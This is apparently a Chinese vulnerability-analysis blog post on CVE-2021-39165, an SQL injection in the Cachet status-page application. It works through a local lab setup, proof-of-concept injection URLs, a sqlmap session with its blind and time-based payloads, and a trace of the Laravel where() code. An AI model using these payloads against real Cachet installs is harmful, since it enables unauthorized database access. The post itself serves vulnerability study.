---
title: "CVE-2021-39165 Cachet SQL注入分析"
date: 2023-05-08T23:24:02+08:00
tags: ["web漏洞分析","SQL注入"]
categories: ["web漏洞分析"]
draft: false
---

文章是通过P师傅的 `https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html` 学习 SQL注入的漏洞

## 环境搭建

Windows + phpstudy

Cahcet项目地址：`https://github.com/CachetHQ/Cachet`
Cachet官网：`https://github.com/CachetHQ/Cachet`
版本：Cachet-2.3.18

安装方式可以参考：`https://docs.cachethq.io/docs/installing-cachet`

搭建环境需要注意一个地方，需要配置伪静态：

```apache
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]
</IfModule>
```

如果不配置为静态，会导致访问的时候必须是 `/index.php` 访问，但是安装执行初始化的时候，发送的请求的url 默认没有`index.php`

## 漏洞验证

访问 `http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=?%20and%201=1)--` 可以返回数据

```json
{
    "meta": {
        "pagination": {
            "total": 1,
            "count": 1,
            "per_page": 20,
            "current_page": 1,
            "total_pages": 1,
            "links": {
                "next_page": null,
                "previous_page": null
            }
        }
    },
    "data": [
        {
            "id": 1,
            "name": "test",
            "description": "test",
            "link": "",
            "status": 1,
            "order": 0,
            "group_id": 0,
            "enabled": true,
            "created_at": "2023-05-09 10:56:41",
            "updated_at": "2023-05-09 10:56:41",
            "deleted_at": null,
            "status_name": "运行正常",
            "tags": {
                "": ""
            }
        }
    ]
}
```

访问 `http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=?%20and%201=2)--` data 中为空

```json
{
    "meta": {
        "pagination": {
            "total": 0,
            "count": 0,
            "per_page": 20,
            "current_page": 1,
            "total_pages": 0,
            "links": {
                "next_page": null,
                "previous_page": null
            }
        }
    },
    "data": []
}
```

通过SQLMap进行测试：

```bash
❯ python3 sqlmap.py -u "http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.1.1#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:11:36 /2023-05-09/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
[11:11:39] [INFO] resuming back-end DBMS 'mysql' 
[11:11:39] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or 'a'=? and 1=1) AND 8193=8193 -- 

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or 'a'=? and 1=1) AND (SELECT 1816 FROM (SELECT(SLEEP(5)))BTmc) --
---
[11:11:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.1.9, Apache 2.4.39
back-end DBMS: MySQL >= 5.0.12
[11:11:39] [INFO] fetching database names
[11:11:39] [INFO] fetching number of databases
[11:11:39] [INFO] resumed: 2
[11:11:39] [INFO] resumed: information_schema
[11:11:39] [INFO] resumed: cachet
available databases [2]:
[*] cachet
[*] information_schema

```

## 漏洞分析

`Cachet` 是基于 Laraverl 框架实现的，按照P师傅的文章，主要关注如下部分：

- 网站路由 (app/Http/Routes)
- 控制器（app/Http/Controllers）
- 中间件（app/Http/Middleware）
- Model（app/Models）
- 网站配置（config）
- 第三方扩展（composer.json）

关于StatusPage的相关路由(app/Http/Routes/StatusPageRoutes.php)

```PHP
class StatusPageRoutes
{
    /**
     * Define the status page routes.
     *
     * @param \Illuminate\Contracts\Routing\Registrar $router
     *
     * @return void
     */
    public function map(Registrar $router)
    {
        $router->group(['middleware' => ['web', 'ready', 'localize']], function (Registrar $router) {
            $router->get('/', [
                'as'   => 'status-page',
                'uses' => 'StatusPageController@showIndex',
            ]);

            $router->get('incident/{incident}', [
                'as'   => 'incident',
                'uses' => 'StatusPageController@showIncident',
            ]);

            $router->get('metrics/{metric}', [
                'as'   => 'metrics',
                'uses' => 'StatusPageController@getMetrics',
            ]);

            $router->get('component/{component}/shield', 'StatusPageController@showComponentBadge');
        });
    }
}
```

通过这个部分可以看到的信息有：

- path 对应的Controller的方法
- 该模块使用的中间件

这里使用了三个中间件 `['web', 'ready', 'localize']`， 可以根据名字在 `app/Http/Kernel` 找到对应的中间件。
在漏洞挖掘中，我们可以先关注那些不需要检验权限的Controller,对于 Cachet 代码中，即那些没有使用 admin 和 auth 中间件的 controller。

存在漏洞的地方 `app/Http/Controllers/Api/ComponentController.php的getComponents`：

```PHP
    /**
     * Get all components.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function getComponents()
    {
        if (app(Guard::class)->check()) {
            $components = Component::query();
        } else {
            $components = Component::enabled();
        }

        $components->search(Binput::except(['sort', 'order', 'per_page']));

        if ($sortBy = Binput::get('sort')) {
            $direction = Binput::has('order') && Binput::get('order') == 'desc';

            $components->sort($sortBy, $direction);
        }

        $components = $components->paginate(Binput::get('per_page', 20));

        return $this->paginator($components, Request::instance());
    }
```

这里有一个点需要关注：

```PHP
$components->search(Binput::except(['sort', 'order', 'per_page']));
$components->sort($sortBy, $direction);
```

sort和search方法都不是Laravel自带的Model方法，其实目前来说各个web框架的ORM都很难存在SQL注入的相关漏洞，但是往往这种自定义的方法，因为开发者的大意而存在漏洞。
sort和search方法就是自定义的scope，scope是定义在Model中可以被重用的方法，他们都以scope开头，可以在 `app/Models/Traits`目录下找到，如存在漏洞的 `SearchableTrait`

```PHP
trait SearchableTrait
{
    /**
     * Adds a search scope.
     *
     * @param \Illuminate\Database\Eloquent\Builder $query
     * @param array                                 $search
     *
     * @return \Illuminate\Database\Eloquent\Builder
     */
    public function scopeSearch(Builder $query, array $search = [])
    {
        if (empty($search)) {
            return $query;
        }

        if (!array_intersect(array_keys($search), $this->searchable)) {
            return $query;
        }

        return $query->where($search);
    }
}

```

Cachet在调用search时传入的是`Binput::except(['sort', 'order', 'per_page'])`，这个返回值是将用户完整的输入除掉`sort`、`order`、`per_page`三个key组成的数组。也就是说，传入`scopeSearch`的这个`$search`数组的键、值都是用户可控的。
在这段代码中存在一个判断：

```PHP
if (!array_intersect(array_keys($search), $this->searchable)) {
    return $query;
}
```

`array_intersect`这个函数，他的功能是计算两个输入数组的交集这个判断其实是比较好绕过的，输入中数组中只要有一个key在`$this->searchable`中就可以绕过，我们输入的数组`$search` 就可以完整的传入到 `where`条件中。

这里需要知道 `Laraverl` 的`where`的用法：

```PHP
DB::table('dual')->where('id', 1);
// 生成的WHERE条件是：WHERE id = v


DB::table('dual')->where('id', '>', 18);
// 生成的WHERE条件是：WHERE id > 18

DB::table('dual')->where([
    ['id', '>', '18'],
    ['title', 'LIKE', '%example%']
]);
// 生成的WHERE条件是：WHERE id > 18 AND title LIKE '%example%'
```

通过Debug的方式看Where的逻辑：

```PHP
/**
 * Add a basic where clause to the query.
 *
 * @param  string  $column
 * @param  string  $operator
 * @param  mixed   $value
 * @param  string  $boolean
 * @return $this
 */
public function where($column, $operator = null, $value = null, $boolean = 'and')
{
    if ($column instanceof Closure) {
        $query = $this->model->newQueryWithoutScopes();

        call_user_func($column, $query);

        $this->query->addNestedWhereQuery($query->getQuery(), $boolean);
    } else {
        call_user_func_array([$this->query, 'where'], func_get_args());
    }

    return $this;
}
```

接着跟进，代码会执行到：`src/Illuminate/Database/Query/Builder.php`，
当第一个参数是数组时，将会执行到addArrayOfWheres()方法。

```PHP
/**
* Add a basic where clause to the query.
*
* @param  string|array|\Closure  $column
* @param  string  $operator
* @param  mixed   $value
* @param  string  $boolean
* @return $this
*
* @throws \InvalidArgumentException
*/
public function where($column, $operator = null, $value = null, $boolean = 'and')
{
    // If the column is an array, we will assume it is an array of key-value pairs
    // and can add them each as a where clause. We will maintain the boolean we
    // received when the method was called and pass it into the nested where.
    if (is_array($column)) {
        return $this->addArrayOfWheres($column, $boolean);
    }

    // Here we will make some assumptions about the operator. If only 2 values are
    // passed to the method, we will assume that the operator is an equals sign
    // and keep going. Otherwise, we'll require the operator to be passed in.
    if (func_num_args() == 2) {
        list($value, $operator) = [$operator, '='];
    } elseif ($this->invalidOperatorAndValue($operator, $value)) {
        throw new InvalidArgumentException('Illegal operator and value combination.');
    }

    // If the columns is actually a Closure instance, we will assume the developer
    // wants to begin a nested where statement which is wrapped in parenthesis.
    // We'll add that Closure to the query then return back out immediately.
    if ($column instanceof Closure) {
        return $this->whereNested($column, $boolean);
    }

    // If the given operator is not found in the list of valid operators we will
    // assume that the developer is just short-cutting the '=' operators and
    // we will set the operators to '=' and set the values appropriately.
    if (! in_array(strtolower($operator), $this->operators, true) &&
        ! in_array(strtolower($operator), $this->grammar->getOperators(), true)) {
        list($value, $operator) = [$operator, '='];
    }

    // If the value is a Closure, it means the developer is performing an entire
    // sub-select within the query and we will need to compile the sub-select
    // within the where clause to get the appropriate query record results.
    if ($value instanceof Closure) {
        return $this->whereSub($column, $operator, $value, $boolean);
    }

    // If the value is "null", we will just assume the developer wants to add a
    // where null clause to the query. So, we will allow a short-cut here to
    // that method for convenience so the developer doesn't have to check.
    if (is_null($value)) {
        return $this->whereNull($column, $boolean, $operator != '=');
    }

    // Now that we are working with just a simple query we can put the elements
    // in our array and add the query binding to our array of bindings that
    // will be bound to each SQL statements when it is finally executed.
    $type = 'Basic';

    if (Str::contains($column, '->') && is_bool($value)) {
        $value = new Expression($value ? 'true' : 'false');
    }

    $this->wheres[] = compact('type', 'column', 'operator', 'value', 'boolean');

    if (! $value instanceof Expression) {
        $this->addBinding($value, 'where');
    }

    return $this;
}
```

接着跟进，带执行到如下代码，

```PHP
/**
 * Add an array of where clauses to the query.
 *
 * @param  array  $column
 * @param  string  $boolean
 * @param  string  $method
 * @return $this
 */
protected function addArrayOfWheres($column, $boolean, $method = 'where')
{
    return $this->whereNested(function ($query) use ($column, $method) {
        foreach ($column as $key => $value) {
            if (is_numeric($key) && is_array($value)) {
                call_user_func_array([$query, $method], $value);
            } else {
                $query->$method($key, '=', $value);
            }
        }
    }, $boolean);
}

/**
 * Add a nested where statement to the query.
 *
 * @param  \Closure $callback
 * @param  string   $boolean
 * @return \Illuminate\Database\Query\Builder|static
 */
public function whereNested(Closure $callback, $boolean = 'and')
{
    $query = $this->forNestedWhere();

    call_user_func($callback, $query);

    return $this->addNestedWhereQuery($query, $boolean);
}
```

可以观察到，这里遍历了用户输入的第一个数组参数`$column`，当发现其键名是一个数字，且键值是一个数组时，将会调用`[$query, $method]`，也就是`$this->where()`，并将完整的`$value`数组作为参数列表传入。

通过这个方法，就可以做到了一件事情：从控制`where()`的第一个参数，到能够完整控制`where()`的所有参数。

再看`where()`函数：

```PHP
public function where($column, $operator = null, $value = null, $boolean = 'and')
```

通过访问如下url进行测试：`http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=xxx`，debug到where函数时，可以看到我们的xxx替换了`$boolean`,并且最终的报错并没有对`$boolean`做任何校验：

![sql](/images/cachet/sql.png)

所以`1[3]`参数可以注入任何语句，所以这里存在一个SQL注入漏洞。

## 总结

这个注入点的发现过程挺有意思的，具体过程可以看P师傅的文章。也让自己思考在各种框架以及ORM完善的情况，如何挖掘类似的漏洞？自己总结

- 多关注对权限宽松的API
- 关注框架提供的自定义功能,开发者的疏忽产生漏洞的点

## 相关链接

- <https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html>
- <https://docs.cachethq.io/docs/installing-cachet>